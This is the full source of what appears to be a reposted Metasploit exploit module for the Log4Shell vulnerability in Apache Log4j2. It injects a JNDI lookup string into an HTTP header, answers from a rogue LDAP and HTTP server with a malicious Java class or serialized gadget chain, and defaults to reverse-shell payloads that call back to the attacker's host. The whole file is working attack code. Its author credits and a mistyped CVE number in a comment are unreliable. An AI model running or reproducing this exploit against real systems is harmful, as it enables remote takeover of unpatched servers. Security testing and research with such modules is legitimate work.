##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
 
  include Msf::Exploit::JavaDeserialization
  include Msf::Exploit::Java
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::LDAP::Server
  include Msf::Exploit::Remote::CheckModule
  prepend Msf::Exploit::Remote::AutoCheck
 
  def initialize(_info = {})
    super(
      'Name' => 'Log4Shell HTTP Header Injection',
      'Description' => %q{
        Versions of Apache Log4j2 impacted by CVE-2021-44228 which allow JNDI features used in configuration,
        log messages, and parameters, do not protect against attacker controlled LDAP and other JNDI related endpoints.
 
        This module will exploit an HTTP end point with the Log4Shell vulnerability by injecting a format message that
        will trigger an LDAP connection to Metasploit and load a payload.
 
        The Automatic target delivers a Java payload using remote class loading. This requires Metasploit to run an HTTP
        server in addition to the LDAP server that the target can connect to. The targeted application must have the
        trusted code base option enabled for this technique to work.
 
        The non-Automatic targets deliver a payload via a serialized Java object. This does not require Metasploit to
        run an HTTP server and instead leverages the LDAP server to deliver the serialized object. The target
        application in this case must be compatible with the user-specified JAVA_GADGET_CHAIN option.
      },
      'Author' => [
        'Xien Genesis', # Technical guidance, examples, and patience - all of the Jedi stuff
        'Mark Louise', # 2011-3544 building blocks reused in this module
        'sinn3r', # 2011-3544 building blocks reused in this module
        'Black_Lady', # Kickoff on 2022-44228 work, improvements, and polish required for formal acceptance
        'Monero <Mrrobot[at]Fsociety>' # Metasploit module and infrastructure
      ],
      'References' => [
        [ 'CVE', '2021-44228' ],
      ],
      'DisclosureDate' => '2022-05-06',
      'License' => MSF_LICENSE,
      'DefaultOptions' => {
        'SRVPORT' => 389,
        'WfsDelay' => 30,
        'CheckModule' => 'auxiliary/scanner/http/log4shell_scanner'
      },
      'Targets' => [
        [
          'Automatic', {
            'Platform' => 'java',
            'Arch' => [ARCH_JAVA],
            'RemoteLoad' => true,
            'DefaultOptions' => {
              'PAYLOAD' => 'java/shell_reverse_tcp'
            }
          }
        ],
        [
          'Windows', {
            'Platform' => 'win',
            'RemoteLoad' => false,
            'DefaultOptions' => {
              'PAYLOAD' => 'windows/meterpreter/reverse_tcp'
            }
          },
        ],
        [
          'Linux', {
            'Platform' => 'unix',
            'RemoteLoad' => false,
            'Arch' => [ARCH_CMD],
            'DefaultOptions' => {
              'PAYLOAD' => 'cmd/unix/reverse_bash'
            }
          },
        ]
      ],
      'Notes' => {
        'Stability' => [CRASH_SAFE],
        'SideEffects' => [IOC_IN_LOGS],
        'AKA' => ['Log4Shell', 'LogJam'],
        'Reliability' => [REPEATABLE_SESSION],
        'RelatedModules' => [ 'auxiliary/scanner/http/log4shell_scanner' ]
      },
      'Stance' => Msf::Exploit::Stance::Aggressive
    )
    register_options([
      OptString.new('HTTP_METHOD', [ true, 'The HTTP method to use', 'GET' ]),
      OptString.new('TARGETURI', [ true, 'The URI to scan', '/']),
      OptString.new('HTTP_HEADER', [ false, 'The HTTP header to inject into' ]),
      OptEnum.new('JAVA_GADGET_CHAIN', [
        true, 'The ysoserial payload to use for deserialization', 'CommonsBeanutils1',
        Msf::Util::JavaDeserialization.ysoserial_payload_names
      ], conditions: %w[TARGET != Automatic]),
      OptPort.new('HTTP_SRVPORT', [true, 'The HTTP server port', 8080], conditions: %w[TARGET == Automatic]),
      OptBool.new('LDAP_AUTH_BYPASS', [true, 'Ignore LDAP client authentication', true])
    ])
  end
 
  def check
    validate_configuration!
    # set these scanner options as appropriate based on the config
    datastore['URIS_FILE'] = nil
    if !datastore['HTTP_HEADER'].blank?
      datastore['HEADERS_FILE'] = nil
    end
 
    @checkcode = super
  end
 
  def jndi_string
    "${jndi:ldap://#{datastore['SRVHOST']}:#{datastore['SRVPORT']}/dc=#{Rex::Text.rand_text_alpha_lower(6)},dc=#{Rex::Text.rand_text_alpha_lower(3)}}"
  end
 
  def resource_url_string
    "http#{datastore['SSL'] ? 's' : ''}://#{datastore['SRVHOST']}:#{datastore['HTTP_SRVPORT']}#{resource_uri}"
  end
 
  #
  # Use Ruby Java bridge to create a Java-natively-serialized object
  #
  # @return [String] Marshalled serialized byteArray of the loader class
  def byte_array_payload(pay_class = 'metasploit.PayloadFactory')
    jar = generate_payload.encoded_jar
    serialized_class_from_jar(jar, pay_class)
  end
 
  #
  # Insert PayloadFactory in Java payload JAR
  #
  # @param jar [Rex::Zip::Jar] payload JAR to update
  # @return [Rex::Zip::Jar] updated payload JAR
  def inject_jar_payload_factory(jar = generate_payload.encoded_jar)
    # From exploits/multi/browser/java_rhino - should probably go to lib
    paths = [
      [ 'metasploit/PayloadFactory.class' ]
    ]
    paths.each do |path|
      1.upto(path.length - 1) do |idx|
        full = path[0, idx].join('/') + '/'
        jar.add_file(full, '') unless jar.entries.map(&:name).include?(full)
      end
      File.open(File.join(Msf::Config.data_directory, 'exploits', 'CVE-2021-44228', path), 'rb') do |fd|
        data = fd.read(fd.stat.size)
        jar.add_file(path.join('/'), data)
      end
    end
    jar
  end
 
  #
  # Generate and serialize the payload as an LDAP search response
  #
  # @param msg_id [Integer] LDAP message identifier
  # @param base_dn [Sting] LDAP distinguished name
  #
  # @return [Array] packed BER sequence
  def serialized_payload(msg_id, base_dn, pay_class = 'metasploit.PayloadFactory')
    if target['RemoteLoad']
      attrs = [
        [ 'javaClassName'.to_ber, [ pay_class.to_ber].to_ber_set ].to_ber_sequence,
        [ 'javaFactory'.to_ber, [ pay_class.to_ber].to_ber_set ].to_ber_sequence,
        [ 'objectClass'.to_ber, [ 'javaNamingReference'.to_ber ].to_ber_set ].to_ber_sequence,
        [ 'javaCodebase'.to_ber, [ resource_url_string.to_ber ].to_ber_set ].to_ber_sequence,
      ]
    else
      java_payload = generate_java_deserialization_for_payload(datastore['JAVA_GADGET_CHAIN'], payload)
      # vprint_good("Serialized java payload: #{java_payload}")
      attrs = [
        [ 'javaClassName'.to_ber, [ rand_text_alphanumeric(8..15).to_ber ].to_ber_set ].to_ber_sequence,
        [ 'javaSerializedData'.to_ber, [ java_payload.to_ber ].to_ber_set ].to_ber_sequence
      ]
    end
    appseq = [
      base_dn.to_ber,
      attrs.to_ber_sequence
    ].to_ber_appsequence(Net::LDAP::PDU::SearchReturnedData)
    [ msg_id.to_ber, appseq ].to_ber_sequence
  end
 
  ## LDAP service callbacks
  #
  # Handle incoming requests via service mixin
  #
  def on_dispatch_request(client, data)
    return if data.strip.empty?
 
    data.extend(Net::BER::Extensions::String)
    begin
      pdu = Net::LDAP::PDU.new(data.read_ber!(Net::LDAP::AsnSyntax))
      vprint_status("LDAP request data remaining: #{data}") unless data.empty?
      resp = case pdu.app_tag
             when Net::LDAP::PDU::BindRequest # bind request
               client.authenticated = true
               service.encode_ldap_response(
                 pdu.message_id,
                 Net::LDAP::ResultCodeSuccess,
                 '',
                 '',
                 Net::LDAP::PDU::BindResult
               )
             when Net::LDAP::PDU::SearchRequest # search request
               if client.authenticated || datastore['LDAP_AUTH_BYPASS']
                 client.write(serialized_payload(pdu.message_id, pdu.search_parameters[:base_object]))
                 service.encode_ldap_response(pdu.message_id, Net::LDAP::ResultCodeSuccess, '', 'Search success', Net::LDAP::PDU::SearchResult)
               else
                 service.encode_ldap_response(pdu.message_i, 50, '', 'Not authenticated', Net::LDAP::PDU::SearchResult)
               end
             else
               vprint_status("Client sent unexpected request #{pdu.app_tag}")
               client.close
             end
      resp.nil? ? client.close : on_send_response(client, resp)
    rescue StandardError => e
      print_error("Failed to handle LDAP request due to #{e}")
      client.close
    end
    resp
  end
 
  ## HTTP service callbacks
  #
  # Handle HTTP requests and responses
  #
  def on_request_uri(cli, request)
    agent = request.headers['User-Agent']
    vprint_good("Payload requested by #{cli.peerhost} using #{agent}")
    pay = regenerate_payload(cli)
    jar = inject_jar_payload_factory(pay.encoded_jar)
    send_response(cli, 200, 'OK', jar)
  end
 
  #
  # Create an HTTP response and then send it
  #
  def send_response(cli, code, message = 'OK', html = '')
    proto = Rex::Proto::Http::DefaultProtocol
    res = Rex::Proto::Http::Response.new(code, message, proto)
    res['Content-Type'] = 'application/java-archive'
    res.body = html
    cli.send_response(res)
  end
 
  def exploit
    validate_configuration!
    if datastore['HTTP_HEADER'].blank?
      targetinfo = (@checkcode&.details || []).reject { |ti| ti[:headers]&.empty? }.first
      http_header = targetinfo[:headers].keys.first if targetinfo
      fail_with(Failure::BadConfig, 'No HTTP_HEADER was specified and none were found automatically') unless http_header
 
      print_good("Automatically identified vulnerable header: #{http_header}")
    else
      http_header = datastore['HTTP_HEADER']
    end
 
    # LDAP service
    start_service
    # HTTP service
    start_http_service if target['RemoteLoad']
    # HTTP request initiator
    send_request_raw(
      'uri' => normalize_uri(target_uri),
      'method' => datastore['HTTP_METHOD'],
      'headers' => { http_header => jndi_string }
    )
    sleep(datastore['WfsDelay'])
    handler
  ensure
    cleanup
  end
 
  #
  # Kill HTTP & LDAP services (shut them down and clear resources)
  #
  def cleanup
    # Clean and stop HTTP server
    if @http_service
      begin
        @http_service.remove_resource(datastore['URIPATH'])
        @http_service.deref
        @http_service.stop
        @http_service = nil
      rescue StandardError => e
        print_error("Failed to stop http server due to #{e}")
      end
    end
    super
  end
 
  private
 
  # Boilerplate HTTP service code
  #
  # Returns the configured (or random, if not configured) URI path
  #
  def resource_uri
    path = datastore['URIPATH'] || rand_text_alphanumeric(rand(8..15)) + '.jar'
    path = '/' + path if path !~ %r{^/}
    if path !~ /\.jar$/
      print_status("Appending .jar extension to #{path} as we don't yet serve classpaths")
      path += '.jar'
    end
    datastore['URIPATH'] = path
    return path
  end
 
  #
  # Handle the HTTP request and return a response.  Code borrowed from:
  # msf/core/exploit/http/server.rb
  #
  def start_http_service(opts = {})
    comm = datastore['ListenerComm']
    if (comm.to_s == 'local')
      comm = ::Rex::Socket::Comm::Local
    else
      comm = nil
    end
    # Default the server host / port
    opts = {
      'ServerHost' => datastore['SRVHOST'],
      'ServerPort' => datastore['HTTP_SRVPORT'],
      'Comm' => comm
    }.update(opts)
    # Start a new HTTP server
    @http_service = Rex::ServiceManager.start(
      Rex::Proto::Http::Server,
      opts['ServerPort'].to_i,
      opts['ServerHost'],
      datastore['SSL'],
      {
        'Msf' => framework,
        'MsfExploit' => self
      },
      opts['Comm'],
      datastore['SSLCert']
    )
    @http_service.server_name = datastore['HTTP::server_name']
    # Default the procedure of the URI to on_request_uri if one isn't
    # provided.
    uopts = {
      'Proc' => method(:on_request_uri),
      'Path' => resource_uri
    }.update(opts['Uri'] || {})
    proto = (datastore['SSL'] ? 'https' : 'http')
    print_status("Serving Java code on: #{proto}://#{opts['ServerHost']}:#{opts['ServerPort']}#{uopts['Path']}")
    if (opts['ServerHost'] == '0.0.0.0')
      print_status(" Local IP: #{proto}://#{Rex::Socket.source_address}:#{opts['ServerPort']}#{uopts['Path']}")
    end
    # Add path to resource
    @service_path = uopts['Path']
    @http_service.add_resource(uopts['Path'], uopts)
  end
 
  def validate_configuration!
    fail_with(Failure::BadConfig, 'The SRVHOST option must be set to a routable IP address.') if ['0.0.0.0', '::'].include?(datastore['SRVHOST'])
    if datastore['HTTP_HEADER'].blank? && !datastore['AutoCheck']
      fail_with(Failure::BadConfig, 'Either the AutoCheck option must be enabled or an HTTP_HEADER must be specified.')
    end
  end
end
 
